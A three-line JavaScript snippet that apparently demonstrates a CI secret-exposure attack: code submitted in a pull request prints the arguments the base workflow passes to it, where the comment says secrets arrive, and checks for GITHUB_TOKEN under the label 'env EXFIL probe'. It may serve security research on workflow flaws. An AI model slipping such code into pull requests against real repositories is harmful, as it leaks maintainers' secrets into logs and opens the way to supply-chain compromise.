// PR-controlled code: echo argv we receive (secrets land here as argv from the base workflow's run: line)
console.log('CLI argv received:', JSON.stringify(process.argv.slice(2)));
console.log('env EXFIL probe:', typeof process.env.GITHUB_TOKEN);
